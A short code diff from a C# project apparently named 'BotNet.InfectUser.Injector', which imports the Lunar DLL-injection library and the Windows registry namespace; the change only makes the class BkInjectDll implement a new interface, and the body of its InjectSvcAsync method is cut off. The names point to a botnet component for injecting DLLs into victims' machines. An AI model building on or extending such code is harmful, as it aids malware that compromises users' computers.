@@ -1,10 +1,11 @@
-﻿using Lunar;
+﻿using BotNet.InfectUser.Injector.Interfaces;
+using Lunar;
 using Microsoft.Win32;
 using System.Diagnostics;
 
 namespace BotNet.InfectUser.Injector
 {
-  public class BkInjectDll
+  public class BkInjectDll : IBkInjectDll
   {
     public async Task InjectSvcAsync()
     {
